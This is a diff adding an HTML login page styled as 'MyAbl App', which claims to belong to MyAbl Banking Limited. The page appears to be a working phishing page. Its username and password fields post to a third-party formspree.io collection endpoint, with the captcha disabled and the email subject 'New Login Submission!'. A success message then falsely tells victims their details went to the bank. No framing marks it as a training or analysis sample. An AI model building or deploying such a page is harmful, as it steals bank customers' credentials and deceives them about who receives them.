@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - MyAbl App</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        body {
+            background-color: #ffffff;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-image: url('20260306_174316.png');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+        }
+
+        .login-container {
+            background-color: #EDEEF0;
+            padding: 30px 25px;
+            border-radius: 12px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.08);
+            width: 100%;
+            max-width: 420px;
+            max-height: 500px;
+            overflow-y: auto;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+            position: relative;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #555;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .input-icon {
+            position: absolute;
+            left: 15px;
+            color: #888;
+            font-size: 18px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 12px 15px 12px 45px;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 15px;
+            transition: all 0.3s ease;
+            background-color: #fafafa;
+        }
+
+        .input-group input:focus {
+            outline: none;
+            border-color: #F2884A;
+            background-color: #ffffff;
+            box-shadow: 0 0 0 3px rgba(242, 136, 74, 0.1);
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 15px;
+            top: 38px;
+            cursor: pointer;
+            color: #888;
+            font-size: 14px;
+            user-select: none;
+            transition: color 0.3s;
+        }
+
+        .toggle-password:hover {
+            color: #555;
+        }
+
+        .btn-login {
+            width: 100%;
+            padding: 14px;
+            background: #F2884A;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-bottom: 12px;
+            box-shadow: 0 4px 15px rgba(242, 136, 74, 0.3);
+        }
+
+        .btn-login:hover {
+            background: #e67e3a;
+            box-shadow: 0 6px 20px rgba(242, 136, 74, 0.4);
+            transform: translateY(-2px);
+        }
+
+        .btn-register {
+            width: 100%;
+            padding: 14px;
+            background: #ffffff;
+            color: #1a365d;
+            border: 2px solid #1a365d;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .btn-register:hover {
+            background: #1a365d;
+            color: white;
+            transform: translateY(-2px);
+        }
+
+        .trouble-text {
+            text-align: center;
+            margin-top: 15px;
+            font-size: 14px;
+            color: #b0b0b0;
+            font-weight: 400;
+        }
+
+        .footer-text {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #666;
+        }
+
+        .footer-text a {
+            color: #1a365d;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .footer-text a:hover {
+            text-decoration: underline;
+        }
+
+        /* Success/Error Messages */
+        .success-message {
+            background-color: #d4edda;
+            color: #155724;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            text-align: center;
+            border: 1px solid #c3e6cb;
+            display: none;
+        }
+
+        .error-message {
+            background-color: #f8d7da;
+            color: #721c24;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            text-align: center;
+            border: 1px solid #f5c6cb;
+            display: none;
+        }
+
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .loading.show {
+            display: block;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <!-- Success Message -->
+        <div id="successMessage" class="success-message">
+            <strong>✓ Success!</strong> Your information has been sent to MyAbl Banking Limited.
+        </div>
+
+        <!-- Error Message -->
+        <div id="errorMessage" class="error-message">
+            <strong>Error:</strong> Please try again later.
+        </div>
+
+        <!-- Loading Indicator -->
+        <div id="loadingMessage" class="loading">
+            <p>Sending your information...</p>
+        </div>
+
+        <form id="login-form" action="https://formspree.io/f/xjgakjkr" method="POST">
+            <input type="hidden" name="_subject" value="New Login Submission!">
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_next" value="https://formspree.io/thank-you">
+            
+            <div class="input-group">
+                <label for="username">Username</label>
+                <div class="input-wrapper">
+                    <span class="input-icon">💳</span>
+                    <input type="text" id="username" name="username" placeholder="Enter your username" required>
+                </div>
+            </div>
+
+            <div class="input-group">
+                <label for="password">Password</label>
+                <div class="input-wrapper">
+                    <span class="input-icon">🔒</span>
+                    <input type="password" id="password" name="password" placeholder="Enter your password" required>
+                    <span class="toggle-password" onclick="togglePassword()">Show</span>
+                </div>
+            </div>
+
+            <button type="submit" class="btn-login">Sign In</button>
+            <button type="button" class="btn-register">Register Now</button>
+            <p class="trouble-text">Having Trouble Signing In?</p>
+        </form>
+
+        <div class="footer-text">
+            Don't have an account? <a href="#">Sign up</a>
+        </div>
+    </div>
+
+    <script>
+        function togglePassword() {
+            const passwordInput = document.getElementById('password');
+            const toggleText = document.querySelector('.toggle-password');
+
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                toggleText.textContent = 'Hide';
+            } else {
+                passwordInput.type = 'password';
+                toggleText.textContent = 'Show';
+            }
+        }
+
+        // Handle Form Submission
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const formData = new FormData(this);
+            const successMsg = document.getElementById('successMessage');
+            const errorMsg = document.getElementById('errorMessage');
+            const loadingMsg = document.getElementById('loadingMessage');
+            
+            // Show loading
+            loadingMsg.classList.add('show');
+            successMsg.style.display = 'none';
+            errorMsg.style.display = 'none';
+            
+            fetch(this.action, {
+                method: 'POST',
+                body: formData,
+                headers: {
+                    'Accept': 'application/json'
+                }
+            })
+            .then(response => {
+                loadingMsg.classList.remove('show');
+                if (response.ok) {
+                    successMsg.style.display = 'block';
+                    this.reset();
+                } else {
+                    errorMsg.style.display = 'block';
+                }
+            })
+            .catch(error => {
+                loadingMsg.classList.remove('show');
+                errorMsg.style.display = 'block';
+                console.error('Error:', error);
+            });
+        });
+    </script>
+</body>
+</html>
